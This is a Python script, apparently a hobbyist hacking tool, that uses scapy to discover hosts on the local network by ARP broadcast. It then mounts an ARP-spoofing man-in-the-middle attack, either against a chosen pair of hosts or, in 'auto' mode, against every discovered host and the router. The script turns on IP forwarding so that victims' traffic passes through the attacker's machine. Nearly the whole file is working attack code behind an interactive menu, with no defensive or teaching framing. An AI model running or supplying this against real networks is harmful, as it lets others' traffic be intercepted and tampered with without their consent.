#!/usr/bin/env python

import scapy.all as scapy  # handle tasks like scanning and network discovery
import re  # regular expressions
import time  # use sleep() for delays
import sys  # info about the os


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = brdcast / arp_request  # Combine into a single packet

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    print('[+] Capturing Local Network Address...')
    time.sleep(0.1)
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, netmask, machine_ip = route[4], route[5], route[7]
    if network and netmask:
        print('Network: {}'.format(network))
        print('Netmask: {}'.format(netmask))
        print("Machine's IP: {}".format(machine_ip))
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            print('[+] Scanning Network...')
            time.sleep(0.1)
            final = []
            for _ in range(0, 5):
                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
                if len(temp) > len(final):
                    final = temp
            print('[+] Network scan complete.')
            try:
                final.remove(machine_ip)
            except ValueError:
                pass
            return final  # returns the list with the IPs
        except ValueError:
            print("[!] Something went wrong. Scan failed.")
            return
    else:
        print("[-] Could not read Network or Subnet Mask. Scan failed.")
        time.sleep(0.1)
        return


# function that returns target, source IPs from input
def ip_input(scan_list):
    print("IP Table")
    print("--------")
    for ip in scan_list:
        print(ip)
    print("--------")
    trgt = input('Your target IP: ')
    src = input('Your source IP: ')
    return trgt, src


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        print("[!] No response..")


# function that creates a man in the middle
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


# function that creates a Man in the Middle
def arp_spoof(targets, src):
    sent_packets_count = 0
    if SYS_PLATFORM == 'linux':
        print('This is Linux OS')
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")  # enable ip forwarding to allow flow of packets through machine
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                        sent_packets_count += 2
                print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
                time.sleep(2)  # 2 seconds delay
        except KeyboardInterrupt:
            print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
            for target_ip in targets:
                if target_ip != router_ip:
                    restore(target_ip, src)
                    restore(src, target_ip)
            print("[+] Done!")
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")  # disable ip forwarding
    elif SYS_PLATFORM == 'win32':
        print('This is Windows OS')


# class ArpSpoof:
#     def __init__(self, targets, src):
#         print("[+] Initializing Man-In-The-Middle...")
#         self.source = src
#         self.targets = targets
#
#     def run(self):
#         sent_packets_count = 0
#         if SYS_PLATFORM == 'linux':
#             print('This is Linux OS')
#             try:
#                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
#                     f.write("1")  # enable ip forwarding to allow flow of packets through machine
#                 while True:
#                     for target_ip in self.targets:
#                         if target_ip != router_ip:
#                             spoof(target_ip, self.source)
#                             spoof(self.source, target_ip)
#                             sent_packets_count += 2
#                     print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
#                     time.sleep(2)  # 2 seconds delay
#             except KeyboardInterrupt:
#                 print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
#                 for target_ip in self.targets:
#                     if target_ip != router_ip:
#                         restore(target_ip, self.source)
#                         restore(self.source, target_ip)
#                 print("[+] Done!")
#                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
#                     f.write("0")  # disable ip forwarding
#         elif SYS_PLATFORM == 'win32':
#             print('This is Windows OS')


# -----------------------------INITIALIZE VARIABLES-----------------------------
SYS_PLATFORM = sys.platform  # os of the current machine
command = ''  # command to be executed
scan_result = []  # list of network IPs
router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
# ------------------------------------------------------------------------------

# --------------------------------MENU INTERFACE--------------------------------
print('Welcome back Boss!')
while True:
    print("Insert your command:")
    command = input(">> ")
    # try:
    if command == "exit()":
        print("[+] Cya later Boss!")
        time.sleep(0.1)
        sys.exit()

    elif command == "scan()":
        scan_result = network_scanner()

    elif command == "arpspoof()":
        if scan_result:
            option = ''
            while option != 'auto' and option != 'man':
                print('Type "man" or "auto" for arpspoof()')
                option = input(">> Option: ")
            if option == 'man':
                scan_ip = []
                target, source = ip_input(scan_result)
                while target not in scan_result or source not in scan_result:
                    print("[-] IPs not found in list. Try again")
                    time.sleep(0.1)
                    target, source = ip_input(scan_result)
                scan_ip.append(target)
                arp_spoof(scan_ip, source)
            elif option == 'auto':
                if router_ip:
                    arp_spoof(scan_result, router_ip)
                else:
                    print("[-] Router IP not found. Choose manually..")
                    time.sleep(0.1)
        else:
            print("[-] Network IPs not defined. Please scan() first.")
            time.sleep(0.1)

    elif command == "help()":
        print("----------------------------------")
        print("COMMANDS        DESCRIPTION")
        print("----------------------------------")
        print("help()          Show commands")
        print("scan()          Network scanning")
        print("arpspoof()      Manual or Auto MITM Attack")
        print("exit()          Exit the app")
        print("----------------------------------")

    else:
        print('[-] Command not found. Type help() to show commands.')

    # except Exception:
    #     print('[-] Error during command execution.')
# ------------------------------------------------------------------------------
